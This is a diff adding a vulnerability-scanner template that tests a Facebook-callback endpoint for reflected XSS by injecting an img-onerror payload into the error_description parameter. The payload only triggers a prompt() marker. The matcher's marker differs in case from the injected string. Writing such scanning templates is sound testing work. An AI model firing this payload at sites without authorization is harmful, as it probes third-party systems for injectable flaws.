@@ -1,0 +1,39 @@
+id: kaue-xss-errordescription
+
+info:
+  name: kauexsserrordescription
+  author: kauenavarro
+  severity: medium
+  description: Procura por respostas refletidas.
+  tags: xss
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/authentication/fb_callback?error=access_denied&error_code=200&error_description=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28POCkauenavarroxss%29%3E"
+    
+    redirects: true
+    max-redirects: 1
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Pockauenavarroxss"
+        part: body
+        condition: or
+
+      - type: word
+        words:
+          - "text/html"
+        part: header
+
+      - type: word
+        words:
+          - "<title>Access Denied</title>"
+          - "You don't have permission to access"
+        part: body
+        condition: and
+        negative: true
+
+      - type: status
+        status:
+          - 200
